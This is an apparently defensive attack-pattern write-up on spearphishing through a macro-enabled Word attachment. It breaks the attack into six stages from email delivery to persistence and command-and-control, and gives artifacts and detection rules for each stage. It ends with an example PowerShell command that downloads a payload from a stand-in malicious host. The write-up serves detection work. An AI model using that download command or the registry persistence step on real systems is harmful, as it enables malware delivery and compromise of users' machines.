Pattern Name: Spearphishing Attachment Delivery  
Scenario Overview: An attacker sends a spearphishing email containing a malicious Microsoft Word attachment designed to exploit the user's trust and prompt them to open the file. The attachment contains a macro that, when enabled, executes a payload that compromises the system.

Attack Flow Breakdown:  
**Stage 1: User Interaction**  
- **Application Involved**: Outlook  
- **User Action**: The user receives an email from a seemingly legitimate source (e.g., admin@338) with a subject line that creates urgency (e.g., "Important Update").  
- **Key Artifacts**: Email logs showing the sender's address, subject line, and attachment name (e.g., "Invoice.docm").  
- **Detection Rule**: Monitor for emails with attachments that have .docm extensions and originate from external domains.

**Stage 2: File Opening**  
- **Application Involved**: Microsoft Word  
- **User Action**: The user opens the attachment, triggering a prompt to enable macros.  
- **Key Artifacts**: Process creation logs showing `WINWORD.EXE` initiated by `OUTLOOK.EXE`.  
- **Detection Rule**: Identify process creation events where `WINWORD.EXE` is spawned from `OUTLOOK.EXE` with a .docm file.

**Stage 3: Macro Execution**  
- **Application Involved**: Microsoft Word  
- **User Action**: The user enables macros, allowing the embedded malicious code to execute.  
- **Key Artifacts**: Logs indicating macro execution (e.g., `VBAProject` execution).  
- **Detection Rule**: Monitor for macro execution events within Microsoft Word documents, especially those that were opened from email attachments.

**Stage 4: Payload Execution**  
- **Application Involved**: PowerShell (or another payload execution method)  
- **User Action**: The macro executes a PowerShell command to download and execute a malicious payload from a remote server.  
- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest` or `Start-Process` commands.  
- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.

**Stage 5: Persistence Mechanism**  
- **Application Involved**: Windows Registry  
- **User Action**: The payload modifies registry keys to ensure persistence.  
- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
- **Detection Rule**: Monitor for registry modifications that add new entries for persistence, especially those related to recently executed applications.

**Stage 6: Command and Control Communication**  
- **Application Involved**: Network  
- **User Action**: The compromised system communicates with the attacker's command and control server.  
- **Key Artifacts**: Network logs showing outbound connections to known malicious IP addresses or domains.  
- **Detection Rule**: Analyze network traffic for unusual outbound connections, particularly to newly established domains or IPs.

```shell
# Example PowerShell command executed by the macro to download a payload
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
```
